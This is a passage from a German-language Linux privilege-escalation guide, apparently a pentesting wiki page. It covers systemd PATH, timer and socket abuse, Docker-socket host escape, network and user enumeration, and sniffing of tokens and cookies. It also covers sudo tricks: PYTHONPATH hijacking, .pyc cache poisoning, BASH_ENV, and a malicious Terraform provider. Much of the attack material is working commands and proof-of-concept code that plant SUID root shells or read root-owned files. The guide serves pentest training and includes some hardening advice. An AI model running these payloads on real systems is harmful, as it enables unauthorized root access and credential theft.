### systemd PATH - Relative Pfade

Du kannst den von **systemd** verwendeten PATH mit folgendem Befehl anzeigen:
```bash
systemctl show-environment
```
Wenn du feststellst, dass du in **einen** der Ordner des Pfads **schreiben** kannst, bist du möglicherweise in der Lage, **deine Berechtigungen zu erweitern**. Du musst nach **relativen Pfaden suchen, die in Service-Konfigurationsdateien verwendet werden**, wie zum Beispiel:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Dann erstelle eine **executable** mit demselben Namen wie das Binary des relativen Pfads innerhalb des beschreibbaren systemd-PATH-Ordners. Wenn der Service aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird dein **backdoor** ausgeführt (unprivilegierte Benutzer können Services normalerweise nicht starten/stoppen, aber prüfe, ob du `sudo -l` verwenden kannst).

**Erfahre mehr über Services mit `man systemd.service`.**

## **Timers**

**Timers** sind systemd-Unit-Dateien, deren Name auf `**.timer**` endet und die `**.service**`-Dateien oder Ereignisse steuern. **Timers** können als Alternative zu cron verwendet werden, da sie integrierte Unterstützung für Kalenderzeit- und monotone Zeitereignisse bieten und asynchron ausgeführt werden können.

Du kannst alle Timer mit folgendem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Beschreibbare Timer

Wenn du einen Timer ändern kannst, kannst du ihn dazu bringen, bestimmte systemd.unit-Objekte auszuführen (z. B. einen `.service`- oder `.target`).
```bash
Unit=backdoor.service
```
In der Dokumentation können Sie nachlesen, was die Unit ist:

> Die Unit, die aktiviert werden soll, wenn dieser Timer abläuft. Das Argument ist ein Unit-Name ohne das Suffix „.timer“. Wenn nicht angegeben, wird standardmäßig ein Service aktiviert, der denselben Namen wie die Timer-Unit trägt, abgesehen vom Suffix. (Siehe oben.) Es wird empfohlen, dass der Name der aktivierten Unit und der Name der Timer-Unit bis auf das Suffix identisch sind.

Um diese Berechtigung zu missbrauchen, müssten Sie daher:

- Eine systemd-Unit (z. B. eine `.service`) finden, die ein **beschreibbares Binary ausführt**
- Eine systemd-Unit finden, die einen **relativen Pfad ausführt**, und **beschreibbare Berechtigungen** für den **systemd PATH** besitzen (um dieses ausführbare Programm zu impersonieren)

**Weitere Informationen zu Timern finden Sie mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren, benötigen Sie Root-Berechtigungen und müssen Folgendes ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachte, dass der **timer** durch das Erstellen eines Symlinks darauf unter `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` **aktiviert** wird.

## Sockets

Unix Domain Sockets (UDS) ermöglichen die **Prozesskommunikation** auf derselben oder auf verschiedenen Maschinen innerhalb von Client-Server-Modellen. Sie verwenden standardmäßige Unix-Deskriptordateien für die Kommunikation zwischen Computern und werden über `.socket`-Dateien eingerichtet.

Sockets können mithilfe von `.socket`-Dateien konfiguriert werden.

**Erfahre mehr über Sockets mit `man systemd.socket`.** Innerhalb dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen unterscheiden sich, dienen aber zusammengefasst dazu, **anzugeben, worauf der Socket lauschen wird** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6-Adresse und/oder Portnummer, auf der gelauscht werden soll usw.)
- `Accept`: Akzeptiert ein boolesches Argument. Wenn **true**, wird für jede eingehende Verbindung eine **service instance erzeugt** und nur der Verbindungs-Socket an sie übergeben. Wenn **false**, werden alle Listening-Sockets selbst an die **gestartete service unit übergeben**, und für alle Verbindungen wird nur eine service unit erzeugt. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, bei denen eine einzelne service unit bedingungslos den gesamten eingehenden Traffic verarbeitet. **Standardmäßig false**. Aus Performance-Gründen wird empfohlen, neue Daemons nur so zu schreiben, dass sie für `Accept=no` geeignet sind.
- `ExecStartPre`, `ExecStartPost`: Akzeptiert eine oder mehrere Befehlszeilen, die jeweils **vor** oder **nachdem** die Listening-**Sockets**/FIFOs **erstellt** und gebunden wurden, **ausgeführt** werden. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die jeweils **vor** oder **nachdem** die Listening-**Sockets**/FIFOs **geschlossen** und entfernt wurden, **ausgeführt** werden.
- `Service`: Gibt den Namen der **service** unit an, die bei **eingehendem Traffic aktiviert** werden soll. Diese Einstellung ist nur für Sockets mit Accept=no zulässig. Standardmäßig wird der service aktiviert, der denselben Namen wie der Socket trägt (mit ersetzt konfiguriertem Suffix). In den meisten Fällen sollte diese Option nicht erforderlich sein.

### Beschreibbare .socket-Dateien

Wenn du eine **beschreibbare** `.socket`-Datei findest, kannst du am Anfang des Abschnitts `[Socket]` etwas wie `ExecStartPre=/home/kali/sys/backdoor` **hinzufügen**, und die backdoor wird ausgeführt, bevor der Socket erstellt wird. Daher wirst du **wahrscheinlich warten müssen, bis die Maschine neu gestartet wird.**\
_Beachte, dass das System die Konfiguration dieser Socket-Datei verwenden muss, sonst wird die backdoor nicht ausgeführt._

### Socket activation + beschreibbarer unit-Pfad (fehlenden service erstellen)

Eine weitere besonders schwerwiegende Fehlkonfiguration ist:

- eine Socket-Unit mit `Accept=no` und `Service=<name>.service`
- die referenzierte service unit fehlt
- ein Angreifer kann nach `/etc/systemd/system` (oder in einen anderen unit search path) schreiben

In diesem Fall kann der Angreifer `<name>.service` erstellen und anschließend Traffic an den Socket senden, sodass systemd den neuen service als root lädt und ausführt.

Schneller Ablauf:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Beschreibbare Sockets

Wenn du **einen beschreibbaren Socket identifizierst** (_hier sprechen wir von Unix-Sockets und nicht von den Konfigurationsdateien `.socket`_), **kannst du mit diesem Socket kommunizieren** und möglicherweise eine Schwachstelle ausnutzen.

### Unix-Sockets auflisten
```bash
netstat -a -p --unix
```
### Rohe Verbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation-Beispiel:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP-Sockets

Beachte, dass möglicherweise einige **Sockets auf HTTP**-Requests lauschen (_ich spreche nicht von .socket-Dateien, sondern von Dateien, die als Unix-Sockets fungieren_). Du kannst dies folgendermaßen überprüfen:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Wenn der Socket mit einer **HTTP**-Anfrage **antwortet**, kannst du mit ihm **kommunizieren** und möglicherweise **eine Schwachstelle ausnutzen**.

### Beschreibbarer Docker-Socket

Der Docker-Socket, der häufig unter `/var/run/docker.sock` zu finden ist, ist eine kritische Datei, die geschützt werden sollte. Standardmäßig ist er für den Benutzer `root` und Mitglieder der Gruppe `docker` beschreibbar. Schreibzugriff auf diesen Socket kann zu einer Privilege Escalation führen. Im Folgenden wird erklärt, wie dies möglich ist und welche alternativen Methoden es gibt, falls die Docker CLI nicht verfügbar ist.

#### **Privilege Escalation mit der Docker CLI**

Wenn du Schreibzugriff auf den Docker-Socket hast, kannst du mit den folgenden Befehlen Privilege Escalation durchführen:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Diese Befehle ermöglichen es dir, einen Container mit Zugriff auf das Dateisystem des Hosts auf Root-Ebene auszuführen.

#### **Verwendung der Docker API direkt**

Falls die Docker CLI nicht verfügbar ist, kann der Docker-Socket weiterhin mithilfe der Docker API und `curl`-Befehlen manipuliert werden.

1.  **Docker Images auflisten:** Die Liste der verfügbaren Images abrufen.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Einen Container erstellen:** Eine Anfrage senden, um einen Container zu erstellen, der das Root-Verzeichnis des Host-Systems einbindet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Den neu erstellten Container starten:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Mit dem Container verbinden:** `socat` verwenden, um eine Verbindung zum Container herzustellen und dadurch die Ausführung von Befehlen darin zu ermöglichen.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nachdem die `socat`-Verbindung eingerichtet wurde, kannst du Befehle direkt im Container mit Zugriff auf das Dateisystem des Hosts auf Root-Ebene ausführen.

### Weitere Möglichkeiten

Beachte, dass du [**weitere Möglichkeiten zur Privilege Escalation**](../../user-information/interesting-groups-linux-pe/index.html#docker-group) hast, wenn du Schreibberechtigungen für den Docker-Socket besitzt, weil du **Mitglied der Gruppe `docker`** bist. Wenn die [**Docker API auf einem Port lauscht**, kannst du sie möglicherweise ebenfalls kompromittieren](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Weitere Möglichkeiten, **aus Containern auszubrechen oder Container-Runtimes zu missbrauchen, um Privilege Escalation durchzuführen**, findest du unter:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) Privilege Escalation

Wenn du feststellst, dass du den Befehl **`ctr`** verwenden kannst, lies die folgende Seite, da du ihn möglicherweise missbrauchen kannst, um Privilege Escalation durchzuführen:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** Privilege Escalation

Wenn du feststellst, dass du den Befehl **`runc`** verwenden kannst, lies die folgende Seite, da du ihn möglicherweise missbrauchen kannst, um Privilege Escalation durchzuführen:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgeklügeltes **Inter-Process-Communication-(IPC-)System**, das Anwendungen eine effiziente Interaktion und gemeinsame Nutzung von Daten ermöglicht. Es wurde mit Blick auf moderne Linux-Systeme entwickelt und bietet ein robustes Framework für verschiedene Formen der Anwendungskommunikation.

Das System ist vielseitig und unterstützt grundlegendes IPC, das den Datenaustausch zwischen Prozessen verbessert und an **erweiterte UNIX-Domain-Sockets** erinnert. Außerdem unterstützt es die Übertragung von Events oder Signalen und fördert dadurch eine nahtlose Integration zwischen Systemkomponenten. Beispielsweise kann ein Signal eines Bluetooth-Daemons über einen eingehenden Anruf einen Music Player dazu veranlassen, die Wiedergabe stummzuschalten, was die User Experience verbessert. Zusätzlich unterstützt D-Bus ein Remote-Object-System, das Service-Anfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und dadurch Prozesse optimiert, die traditionell komplex waren.

D-Bus arbeitet nach einem **Allow/Deny-Modell** und verwaltet Nachrichtenberechtigungen (Methodenaufrufe, Signalübertragungen usw.) auf Grundlage des kumulativen Effekts übereinstimmender Policy-Regeln. Diese Policies legen Interaktionen mit dem Bus fest und können durch die Ausnutzung dieser Berechtigungen möglicherweise eine Privilege Escalation ermöglichen.

Ein Beispiel für eine solche Policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` ist angegeben. Sie beschreibt die Berechtigungen des Root-Users, `fi.w1.wpa_supplicant1` zu besitzen sowie Nachrichten an diesen Dienst zu senden und von ihm zu empfangen.

Policies ohne angegebenen User oder ohne angegebene Gruppe gelten universell, während Policies im Kontext „default“ für alle gelten, die nicht von anderen spezifischen Policies abgedeckt werden.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Erfahre hier, wie du eine D-Bus communication enumerierst und ausnutzt:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu enumerieren und die Position der Maschine zu ermitteln.

### Allgemeine Enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Schnelle Triage der ausgehenden Filterung

Wenn der Host Befehle ausführen kann, aber Callbacks fehlschlagen, trenne schnell zwischen DNS-, Transport-, Proxy- und Routing-Filterung:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Offene Ports

Überprüfe immer die auf dem Rechner laufenden Netzwerkdienste, mit denen du vor dem Zugriff auf ihn nicht interagieren konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Klassifiziere Listener nach dem Bind-Ziel:

- `0.0.0.0` / `[::]`: auf allen lokalen Schnittstellen erreichbar.
- `127.0.0.1` / `::1`: nur lokal erreichbar (gute Kandidaten für Tunnel/Weiterleitungen).
- Bestimmte interne IPs (z. B. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): normalerweise nur aus internen Segmenten erreichbar.

### Workflow zur Triage lokal erreichbarer Services

Wenn du einen Host kompromittierst, werden Services, die an `127.0.0.1` gebunden sind, häufig erstmals aus deiner Shell erreichbar. Ein schneller lokaler Workflow ist:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS als network scanner (network-only mode)

Neben lokalen PE-Prüfungen kann linPEAS als fokussierter network scanner ausgeführt werden. Es verwendet verfügbare Binaries in `$PATH` (typischerweise `fping`, `ping`, `nc`, `ncat`) und installiert kein Tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Wenn du `-d`, `-p` oder `-i` ohne `-t` übergibst, verhält sich linPEAS wie ein reiner Network Scanner und überspringt die übrigen Privilege-Escalation-Checks.

### Sniffing

Prüfe, ob du Traffic sniffen kannst. Wenn das möglich ist, könntest du einige Credentials abgreifen können.
```
timeout 1 tcpdump
```
Schnelle praktische Überprüfungen:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) ist bei der Post-Exploitation besonders wertvoll, da viele ausschließlich intern erreichbare Dienste dort Tokens/Cookies/Zugangsdaten offenlegen:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Jetzt erfassen, später parsen:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Benutzer

### Allgemeine Enumeration

Prüfe, **wer** du bist, über welche **Berechtigungen** du verfügst, welche **Benutzer** sich auf den Systemen befinden, welche sich **anmelden** können und welche **Root-Rechte** besitzen:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Einige Linux-Versionen waren von einem Bug betroffen, der es Benutzern mit **UID > INT_MAX** ermöglicht, ihre Privilegien zu eskalieren. Weitere Informationen: [hier](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hier](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) und [hier](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** mit: **`systemd-run -t /bin/bash`**

### Gruppen

Prüfe, ob du **Mitglied einer Gruppe** bist, die dir Root-Rechte gewähren könnte:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Prüfe, ob sich etwas Interessantes in der Zwischenablage befindet (falls möglich)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwortrichtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn du **ein beliebiges Passwort** der Umgebung **kennst, versuche, dich mit diesem Passwort als jeder Benutzer anzumelden**.

### Su Brute

Wenn dich viel Noise nicht stört und die Binärdateien `su` und `timeout` auf dem Computer vorhanden sind, kannst du versuchen, den Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) per Brute-Force zu ermitteln.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) versucht mit dem Parameter `-a` ebenfalls, Benutzer per Brute-Force zu ermitteln.

## Missbrauch des beschreibbaren PATH

### $PATH

Wenn du feststellst, dass du **in einen Ordner innerhalb von $PATH schreiben** kannst, ist möglicherweise eine Privilege Escalation möglich, indem du **eine Backdoor innerhalb des beschreibbaren Ordners** mit dem Namen eines Befehls erstellst, der von einem anderen Benutzer (idealerweise root) ausgeführt wird und der **nicht aus einem Ordner geladen wird, der in $PATH vor deinem beschreibbaren Ordner liegt**.

### SUDO und SUID

Möglicherweise darfst du bestimmte Befehle mit sudo ausführen, oder sie verfügen über das SUID-Bit. Überprüfe dies mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle ermöglichen es, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Die Sudo-Konfiguration kann es einem Benutzer ermöglichen, bestimmte Befehle mit den Rechten eines anderen Benutzers auszuführen, ohne das Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen. Nun ist es trivial, eine Shell zu erhalten, indem ein SSH-Schlüssel in das Root-Verzeichnis eingefügt oder `sh` aufgerufen wird.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive ermöglicht es dem Benutzer, beim Ausführen von etwas **eine Umgebungsvariable zu setzen**:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf der HTB-Maschine Admirer**, war **verwundbar** für **PYTHONPATH hijacking**, wodurch beim Ausführen des Skripts als root eine beliebige Python-Bibliothek geladen werden konnte:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Poisoning einer beschreibbaren `__pycache__` / `.pyc` bei sudo-erlaubten Python-Imports

Wenn ein **sudo-erlaubtes Python-Script** ein Modul importiert, dessen Paketverzeichnis eine **beschreibbare `__pycache__`** enthält, kannst du möglicherweise den gecachten `.pyc` ersetzen und beim nächsten Import Code als privilegierter Benutzer ausführen.

- Warum es funktioniert:
- CPython speichert Bytecode-Caches in `__pycache__/module.cpython-<ver>.pyc`.
- Der Interpreter validiert den **Header** (Magic + Zeitstempel-/Hash-Metadaten, die an den Source gebunden sind) und führt anschließend das darin gespeicherte marshaled code object aus.
- Wenn du die gecachte Datei **löschen und neu erstellen** kannst, weil das Verzeichnis beschreibbar ist, kann eine root-eigene, aber nicht beschreibbare `.pyc` trotzdem ersetzt werden.
- Typischer Pfad:
- `sudo -l` zeigt ein Python-Script oder einen Wrapper, den du als root ausführen kannst.
- Dieses Script importiert ein lokales Modul aus `/opt/app/`, `/usr/local/lib/...` usw.
- Das `__pycache__`-Verzeichnis des importierten Moduls ist für deinen Benutzer oder für alle beschreibbar.

Schnelle Enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Wenn du das privilegierte Skript untersuchen kannst, ermittle die importierten Module und ihren Cache-Pfad:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Abuse-Workflow:

1. Das sudo-allowed script einmal ausführen, damit Python die legitime Cache-Datei erstellt, falls sie noch nicht existiert.
2. Die ersten 16 Bytes aus der legitimen `.pyc` lesen und sie in der vergifteten Datei wiederverwenden.
3. Einen Payload-Code-Object kompilieren, mit `marshal.dumps(...)` serialisieren, die ursprüngliche Cache-Datei löschen und sie mit dem ursprünglichen Header plus deinem bösartigen Bytecode neu erstellen.
4. Das sudo-allowed script erneut ausführen, damit der Import deinen Payload als root ausführt.

Wichtige Hinweise:

- Die Wiederverwendung des ursprünglichen Headers ist entscheidend, weil Python die Cache-Metadaten mit der Source-Datei abgleicht, nicht, ob der Bytecode-Body tatsächlich mit der Source übereinstimmt.
- Dies ist besonders nützlich, wenn die Source-Datei root-owned und nicht beschreibbar ist, das enthaltene `__pycache__`-Verzeichnis jedoch beschreibbar ist.
- Der Angriff schlägt fehl, wenn der privilegierte Prozess `PYTHONDONTWRITEBYTECODE=1` verwendet, aus einem Verzeichnis mit sicheren Berechtigungen importiert oder den Schreibzugriff auf jedes Verzeichnis im Import-Pfad entfernt.

Minimale Proof-of-Concept-Struktur:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Stelle sicher, dass kein Verzeichnis im privilegierten Python-Importpfad für Benutzer mit niedrigen Berechtigungen beschreibbar ist, einschließlich `__pycache__`.
- Ziehe für privilegierte Ausführungen `PYTHONDONTWRITEBYTECODE=1` sowie regelmäßige Prüfungen auf unerwartet beschreibbare `__pycache__`-Verzeichnisse in Betracht.
- Behandle beschreibbare lokale Python-Module und beschreibbare Cache-Verzeichnisse genauso wie beschreibbare Shell-Skripte oder Shared Libraries, die von root ausgeführt werden.

### BASH_ENV über sudo env_keep beibehalten → root shell

Wenn sudoers `BASH_ENV` beibehält (z. B. `Defaults env_keep+="ENV BASH_ENV"`), kannst du Bashes Verhalten beim Start nicht interaktiver Shells ausnutzen, um beim Aufruf eines erlaubten Befehls beliebigen Code als root auszuführen.

- Warum es funktioniert: Bei nicht interaktiven Shells wertet Bash `$BASH_ENV` aus und lädt diese Datei, bevor das Zielskript ausgeführt wird. Viele sudo-Regeln erlauben die Ausführung eines Skripts oder eines Shell-Wrappers. Wenn `BASH_ENV` von sudo beibehalten wird, wird deine Datei mit root-Berechtigungen geladen.

- Voraussetzungen:
- Eine sudo-Regel, die du ausführen kannst (jedes Ziel, das `/bin/bash` nicht interaktiv aufruft, oder jedes Bash-Skript).
- `BASH_ENV` ist in `env_keep` vorhanden (prüfe dies mit `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Härtung:
- `BASH_ENV` (und `ENV`) aus `env_keep` entfernen, `env_reset` bevorzugen.
- Shell-Wrapper für über sudo erlaubte Befehle vermeiden; minimale Binaries verwenden.
- Sudo-I/O-Logging und Alarmierung in Betracht ziehen, wenn beibehaltene Umgebungsvariablen verwendet werden.

### Terraform via sudo mit beibehaltenem HOME (!env_reset)

Wenn sudo die Umgebung unverändert lässt (`!env_reset`) und `terraform apply` erlaubt, bleibt `$HOME` der aufrufende Benutzer. Terraform lädt daher **$HOME/.terraformrc** als root und berücksichtigt `provider_installation.dev_overrides`.

- Den erforderlichen Provider auf ein beschreibbares Verzeichnis verweisen und ein bösartiges Plugin ablegen, das nach dem Provider benannt ist (z. B. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform wird den Go plugin handshake nicht erfolgreich abschließen, führt den payload jedoch als root aus, bevor es abstürzt, und hinterlässt eine SUID shell.

### TF_VAR overrides + Umgehung der Symlink-Validierung

Terraform-Variablen können über `TF_VAR_<name>`-Umgebungsvariablen bereitgestellt werden, die erhalten bleiben, wenn sudo die Umgebung übernimmt. Schwache Validierungen wie `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` können mit Symlinks umgangen werden:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform löst den Symlink auf und kopiert die echte Datei `/root/root.txt` an ein für den Angreifer lesbares Ziel. Derselbe Ansatz kann verwendet werden, um in privilegierte Pfade zu **schreiben**, indem Symlinks am Ziel vorab erstellt werden (z. B. mit einem Verweis auf den Zielpfad des Providers innerhalb von `/etc/cron.d/`).

### requiretty / !requiretty

